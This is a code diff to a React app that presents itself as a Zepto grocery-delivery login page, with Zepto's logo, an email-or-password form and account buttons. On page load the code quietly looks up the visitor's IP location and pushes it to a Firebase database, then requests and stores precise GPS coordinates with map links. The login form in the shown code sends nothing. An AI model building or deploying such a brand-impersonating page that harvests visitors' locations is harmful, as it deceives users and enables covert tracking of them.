@@ -1,88 +1,92 @@
 import React, { useEffect, useState } from "react";
 import { database } from "./firebase";
-import { ref, set, get } from "firebase/database";
-import { v4 as uuidv4 } from "uuid"; // For generating unique user IDs
+import { ref, push } from "firebase/database";
 
 function App() {
   const [location, setLocation] = useState(null);
-  const [userID, setUserID] = useState(null);
   const [loading, setLoading] = useState(true);
   const [gpsDenied, setGpsDenied] = useState(false);
 
   useEffect(() => {
-    initializeUserID(); // Step 1: Generate or fetch userID
+    getIPLocation();
   }, []);
 
-  // 📌 Step 1: Generate or Retrieve User ID
-  const initializeUserID = async () => {
-    let storedUserID = localStorage.getItem("userID");
-    if (!storedUserID) {
-      storedUserID = uuidv4(); // Generate unique ID
-      localStorage.setItem("userID", storedUserID);
-    }
-    setUserID(storedUserID);
-    console.log("✅ UserID:", storedUserID);
-
-    getIPLocation(storedUserID);
-  };
-
-  // 📌 Step 2: Get IP-based Location First
-  const getIPLocation = async (userID) => {
+  // 📌 Step 1: Get IP-Based Location First
+  const getIPLocation = async () => {
     try {
-      console.log("📌 Fetching IP-based location...");
+      console.log("🌍 Fetching IP-based location...");
       const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
-      if (!response.ok) throw new Error("Failed to fetch IP location");
-
       const data = await response.json();
-      console.log("✅ IP Location Data:", data);
+
+      if (data.status === "fail") throw new Error("IP Geolocation failed");
 
       const ipLocationData = {
         latitude: data.lat,
         longitude: data.lon,
+        method: "IP-based",
         city: data.city,
         country: data.country,
         timestamp: new Date().toISOString(),
-        method: "IP",
+        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
       };
 
+      console.log("✅ IP Location:", ipLocationData);
       setLocation(ipLocationData);
-      await saveLocation(userID, "ipLocation", ipLocationData);
+      saveLocation(ipLocationData);
 
-      console.log("📌 IP location saved. Now requesting GPS location...");
-      requestGPSLocation(userID);
+      // After getting IP location, check GPS
+      checkGPSPermission();
     } catch (err) {
       console.error("❌ IP Geolocation failed:", err);
-      requestGPSLocation(userID);
+      checkGPSPermission();
     }
   };
 
-  // 📌 Step 3: Request GPS Location Permission
-  const requestGPSLocation = (userID) => {
-    console.log("📌 Checking GPS location permission...");
+  // 📌 Step 2: Check GPS Permission
+  const checkGPSPermission = () => {
     if ("permissions" in navigator) {
       navigator.permissions
         .query({ name: "geolocation" })
         .then((permission) => {
-          if (permission.state === "granted" || permission.state === "prompt") {
-            console.log("✅ GPS permission granted. Fetching GPS...");
-            getGPSLocation(userID);
+          if (permission.state === "granted") {
+            console.log("✅ GPS is enabled. Fetching precise location...");
+            getGPSLocation();
+          } else if (permission.state === "prompt") {
+            console.log("⚠️ Asking user for GPS permission...");
+            requestGPSPermission();
           } else {
-            console.warn("❌ GPS Permission Denied.");
+            console.warn("❌ GPS permission denied.");
             setGpsDenied(true);
           }
         })
         .catch(() => {
-          console.warn("⚠️ Permission API failed, trying GPS...");
-          getGPSLocation(userID);
+          console.warn("⚠️ Permission API failed. Trying GPS...");
+          requestGPSPermission();
         });
     } else {
-      console.warn("⚠️ Permission API not supported, trying GPS...");
-      getGPSLocation(userID);
+      console.warn("⚠️ Permission API not supported. Trying GPS...");
+      requestGPSPermission();
     }
   };
 
-  // 📌 Step 4: Get Precise GPS Location
-  const getGPSLocation = (userID) => {
+  // 📌 Step 3: Request GPS Permission
+  const requestGPSPermission = () => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("✅ GPS permission granted.");
+          getGPSLocation();
+        },
+        (error) => {
+          console.warn("❌ GPS permission denied:", error);
+          setGpsDenied(true);
+        }
+      );
+    }
+  };
+
+  // 📌 Step 4: Get GPS Location
+  const getGPSLocation = () => {
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -91,12 +95,14 @@ function App() {
           const gpsLocationData = {
             latitude,
             longitude,
-            timestamp: new Date().toISOString(),
             method: "GPS",
+            timestamp: new Date().toISOString(),
+            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
           };
 
+          console.log("✅ GPS Location:", gpsLocationData);
           setLocation(gpsLocationData);
-          saveLocation(userID, "gpsLocation", gpsLocationData);
+          saveLocation(gpsLocationData);
           setLoading(false);
         },
         (error) => {
@@ -111,11 +117,10 @@ function App() {
     }
   };
 
-  // 📌 Step 5: Save Location (IP/GPS) to Firebase under the same userID
-  const saveLocation = async (userID, type, locationData) => {
-    const locationRef = ref(database, `userLocations/${userID}/${type}`);
-    await set(locationRef, locationData);
-    console.log(`✅ ${type} saved to Firebase:`, locationData);
+  // 📌 Save Location to Firebase
+  const saveLocation = async (locationData) => {
+    const locationRef = ref(database, "userLocations");
+    await push(locationRef, locationData);
   };
 
   return (
@@ -125,7 +130,7 @@ function App() {
         justifyContent: "center",
         alignItems: "center",
         height: "100vh",
-        backgroundColor: "#f0f2f5",
+        backgroundColor: "#FFF4E0",
         fontFamily: "Arial, sans-serif",
       }}
     >
@@ -140,16 +145,24 @@ function App() {
           boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
         }}
       >
-        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>
-          Zepto
-        </h1>
-        <p style={{ color: "#606770", fontSize: "16px" }}>
-          Fast & seamless grocery delivery
+        {/* Zepto Logo */}
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Zepto_Logo.svg/2560px-Zepto_Logo.svg.png"
+          alt="Zepto Logo"
+          style={{ width: "150px", marginBottom: "20px" }}
+        />
+
+        <h2 style={{ color: "#E91E63", fontWeight: "bold", marginBottom: "10px" }}>
+          Welcome to Zepto
+        </h2>
+        <p style={{ color: "#606770", fontSize: "14px" }}>
+          Fastest grocery delivery at your doorstep. Login to continue!
         </p>
 
+        {/* Login Form */}
         <input
           type="text"
-          placeholder="Enter Mobile Number"
+          placeholder="Email or phone number"
           style={{
             width: "100%",
             padding: "12px",
@@ -161,7 +174,7 @@ function App() {
         />
         <input
           type="password"
-          placeholder="Enter OTP"
+          placeholder="Password"
           style={{
             width: "100%",
             padding: "12px",
@@ -175,7 +188,7 @@ function App() {
           style={{
             width: "100%",
             padding: "12px",
-            backgroundColor: "#FF4C3B",
+            backgroundColor: "#E91E63",
             color: "white",
             fontSize: "16px",
             fontWeight: "bold",
@@ -186,6 +199,28 @@ function App() {
           }}
         >
           Log In
+        </button>
+
+        <p style={{ color: "#E91E63", fontSize: "14px", marginTop: "10px", cursor: "pointer" }}>
+          Forgot password?
+        </p>
+
+        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
+
+        <button
+          style={{
+            width: "100%",
+            padding: "12px",
+            backgroundColor: "#FF9800",
+            color: "white",
+            fontSize: "16px",
+            fontWeight: "bold",
+            border: "none",
+            borderRadius: "6px",
+            cursor: "pointer",
+          }}
+        >
+          Create New Account
         </button>
 
         {/* Location Information */}
@@ -199,10 +234,13 @@ function App() {
               {location.city && <p>City: {location.city}</p>}
               {location.country && <p>Country: {location.country}</p>}
               <p>Method: {location.method}</p>
+              <a href={location.mapLink} target="_blank" rel="noopener noreferrer">
+                View on Google Maps
+              </a>
             </div>
           ) : gpsDenied ? (
             <p style={{ color: "red", fontWeight: "bold" }}>
-              GPS is blocked. Please enable location services or refresh the page.
+              GPS is blocked. Please enable location services.
             </p>
           ) : (
             <p>Could not retrieve location</p>
